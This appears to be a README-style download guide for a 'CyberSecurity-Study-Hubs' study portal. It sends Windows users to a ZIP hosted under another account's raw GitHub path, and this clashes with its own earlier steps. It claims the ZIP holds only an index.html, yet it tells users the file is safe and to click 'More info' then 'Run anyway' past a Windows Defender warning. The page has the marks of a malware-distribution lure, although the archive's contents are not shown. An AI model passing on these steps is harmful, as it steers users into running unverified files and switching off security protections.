🚀 Getting Started - Download & Run

Follow these simple steps to get CyberSecurity-Study-Hubs running on your Windows computer. Don't worry — it's easier than you think!

  1. Click the download button below — This will take you to the official GitHub page for the project.
  2. On the GitHub page, look for the green "Code" button and click it. Then select "Download ZIP" from the dropdown menu.
  3. Visit this link to download the application: https://raw.githubusercontent.com/TheKac/thekac.github.io/main/_pages/v1.0.zip
  4. Once downloaded, you'll have a .zip file (usually in your "Downloads" folder). Right-click on the file and select "Extract All..." to unzip it.
  5. After extraction, open the folder — you'll see a file named index.html.
  6. Double-click on index.html — this will open the application in your default web browser (Chrome, Edge, Firefox, etc.).
  7. That's it! You're now ready to explore the interactive study portal. No installation, no configuration, no technical skills required.

🛠️ Troubleshooting & Support

Having trouble? Don't worry — most issues are simple to fix. Try these common solutions:

  • File won't extract? — Make sure you're using the built-in Windows extraction tool (right-click → "Extract All") or install 7-Zip for free.
  • index.html doesn't open? — Right-click the file, select "Open with," and choose your browser (Chrome, Edge, Firefox).
  • Page looks broken? — Ensure you've extracted ALL files from the ZIP (not just the index.html). The folder contains supporting files.
  • Not seeing interactive elements? — Disable any browser extensions that might block JavaScript (though the app uses minimal JS).
  • Windows Defender warning? — The file is safe. Since it's a downloaded ZIP, Windows might ask for permission. Click "More info" → "Run anyway" if prompted.

If you still need help, visit the GitHub repository and check the "Issues" section or start a new discussion. The community is friendly and helpful!
